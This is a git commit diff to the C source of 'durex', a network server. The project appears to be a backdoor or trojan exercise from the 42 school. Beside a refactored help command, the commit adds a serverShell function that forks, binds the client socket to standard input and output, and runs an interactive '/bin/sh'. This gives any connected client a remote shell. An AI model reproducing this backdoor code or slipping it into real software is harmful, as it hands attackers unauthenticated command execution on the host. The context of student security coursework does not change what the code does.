9bbc2672bdbe070978c60714f43a0c20ec2f91e7
GBO <gbourgeo@student.42.fr>
2018-07-29 11:01:59 +0200

    changed server commands prototypes to fit the help command

--- durex/srcs/commands.c
+++ durex/srcs/commands.c
@@ -6,28 +6,57 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/16 23:22:39 by root              #+#    #+#             */
-/*   Updated: 2018/07/20 01:01:23 by root             ###   ########.fr       */
+/*   Updated: 2018/07/29 10:24:01 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
+/* wait */
+#include <wait.h>
+
 #include "ft_dprintf.h"
+
 #include "durex.h"
 
-void			serverHelp(t_cl *client)
+void			serverHelp(t_cl *client, t_cmd *cmds)
 {
-	char		*cmd[] = { SERVER_COMMANDS };
-	char		*hlp[] = { SERVER_HELP };
-
-	for (size_t i = 0; i < sizeof(cmd) / sizeof(*cmd); i++) {
-		clientWrite(cmd[i], client);
+	for (size_t i = 0; cmds[i].name; i++) {
+		clientWrite(cmds[i].name, client);
 		clientWrite(": ", client);
-		clientWrite(hlp[i], client);
+		clientWrite(cmds[i].def, client);
 		clientWrite("\n", client);
 	}
 }
 
-void			serverQuitClient(t_cl *client)
+void			serverShell(t_cl *client, t_cmd *cmds)
 {
+	pid_t		pid;
+	int			status;
+
+	(void)cmds;
+	ft_dprintf(client->fd, "Spawning shell on port %s\n", SERVER_PORT);
+	pid = fork();
+	if (pid > 0) {
+		waitpid(pid, &status, WNOHANG);
+	} else if (pid == 0) {
+		char		*cmd[3];
+
+		dup2(client->fd, STDIN_FILENO);
+		dup2(client->fd, STDOUT_FILENO);
+		dup2(client->fd, STDERR_FILENO);
+		cmd[0] = "/bin/sh";
+		cmd[1] = "-i";
+		cmd[2] = NULL;
+		execv(cmd[0], cmd);
+		clientWrite("$> ", client);
+		exit(0);
+	} else {
+		clientWrite("Failed to fork shell\n", client);
+	}
+}
+
+void			serverQuitClient(t_cl *client, t_cmd *cmds)
+{
+	(void)cmds;
 	close(client->fd);
 	clearClient(client);
 }
